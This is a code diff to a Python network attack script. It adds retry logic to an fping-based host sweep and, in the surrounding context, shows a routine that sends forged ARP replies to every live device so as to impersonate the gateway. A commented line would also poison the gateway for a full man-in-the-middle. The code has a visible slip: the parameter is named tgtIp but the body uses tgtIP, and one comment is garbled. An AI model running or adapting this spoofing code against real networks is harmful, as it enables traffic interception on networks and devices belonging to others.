@@ -21,24 +21,35 @@ def netScan(network):
 
     for pinger in pingers:
         pinger.start()
-    
+
     for pinger in pingers:
         pinger.join()
 
     return upIPs
 
+def testUp(address):
+    isUp   = False
+    count  = 0
+    while (not isUp and count < 4):
+        ping = subprocess.call(['fping', '-c', '1', '-t', str(TIMEOUT), address], \
+                    stdout=subprocess.DEVNULL, \
+                    stderr=subprocess.DEVNULL)
+        if ping == 0:
+            isUp = True
+        else:
+            count += 1
+    return isUp
+
 def IPscan(toPingQueue, upIPs):
     """
-    Pings to IPs on the ping Queue.    
+    Pings to IPs on the ping Queue.
     """
     global TIMEOUT
     try:
         while True:
             address = toPingQueue.get_nowait()
-            exitStatus = subprocess.call(['fping', '-c', '1', '-t', str(TIMEOUT), address], \
-                    stdout=subprocess.DEVNULL, \
-                    stderr=subprocess.DEVNULL)
-            if exitStatus == 0:
+            exitStatus = testUp(address)
+            if exitStatus:
                 # print("[+]", address, "up")
                 upIPs.append(address)
 
@@ -60,7 +71,7 @@ def arpSpoof(gwIP, gwMAC, tgtIp, tgtMAC):
     print("[*] Starting ARP spoofing [Ctrl-C to stop]")
     try:
         send(ARP(op=2, pdst=tgtIP, hwdst=tgtMAC, psrc=gwIP) , verbose=False)
-       #send(ARP(op=2, pdst=gwIP , hwdst=gwMAC , psrc=tgtIP), verbose=False) # -> Creates MIT, verbose=FalseM # -> Creates MITM 
+       #send(ARP(op=2, pdst=gwIP , hwdst=gwMAC , psrc=tgtIP), verbose=False) # -> Creates MIT, verbose=FalseM # -> Creates MITM
         time.sleep(2)
     except:
         pass
@@ -91,7 +102,7 @@ def main():
 
     print("[+] Retrieving connected devices")
     pingableIPs = netScan(tgtNet)
-    
+
     print("[+] Spoofing connected devices")
     for device in pingableIPs:
         tgtMAC = getMAC(device)
@@ -99,4 +110,3 @@ def main():
             pass
         else:
             arpSpoof(gwIP, gwMAC, device, tgtMAC)
-
